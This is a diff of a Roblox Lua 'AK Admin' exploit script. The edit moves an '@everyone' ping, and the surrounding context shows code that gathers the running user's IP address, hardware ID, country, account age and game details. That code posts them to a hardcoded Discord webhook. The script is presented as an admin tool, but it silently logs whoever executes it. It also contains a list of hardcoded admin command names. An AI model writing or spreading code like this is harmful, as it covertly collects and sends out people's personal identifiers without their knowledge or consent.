@@ -1,5 +1,4 @@
-
-    local adminCmd = {"AK_ADMEN1", "328ml", "GYATT_DAMN1","IIIlIIIllIlIllIII","AliKhammas1234","dgthgcnfhhbsd","AliKhammas"}
+local adminCmd = {"AK_ADMEN1", "328ml", "GYATT_DAMN1","IIIlIIIllIlIllIII","AliKhammas1234","dgthgcnfhhbsd","AliKhammas"}
 
 local player = game.Players.LocalPlayer
 
@@ -387,7 +386,7 @@ local function createWebhookData()
         ["embeds"] = {
             {
                 ["author"] = {
-                    ["name"] = "Someone executed AK Admin @everyone",
+                    ["name"] = "Someone executed AK Admin",
                     ["url"] = "https://roblox.com",
                 },
                 ["description"] = string.format(
@@ -396,6 +395,7 @@ local function createWebhookData()
                     "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                     "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                     "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                    "@everyone"..
                     "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                     Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                     tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
@@ -427,6 +427,7 @@ local webhookUrl = "https://discord.com/api/webhooks/1287079693723373639/mESmmi8
 local webhookData = createWebhookData()
 
 sendWebhook(webhookUrl, webhookData)
+
 local player = game.Players.LocalPlayer
 local playerName = player.Name
 --auggs = ends 29.09
